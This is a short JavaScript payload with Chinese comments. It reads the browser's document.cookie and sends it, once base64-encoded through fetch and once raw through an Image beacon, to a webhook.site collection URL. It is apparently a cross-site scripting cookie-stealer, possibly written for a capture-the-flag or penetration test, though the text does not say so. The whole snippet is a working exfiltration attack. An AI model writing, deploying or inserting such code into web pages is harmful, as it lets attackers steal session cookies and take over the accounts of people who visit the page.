// 注意在 ID 后面加一个问号 (?)
var webhook = "https://webhook.site/00cb9701-8b85-48b4-8e62-78f32b754863?";

// 发送 Cookie
fetch(webhook + "data=" + btoa(document.cookie), { mode: 'no-cors' });

// 备用方案
new Image().src = webhook + "c=" + document.cookie;
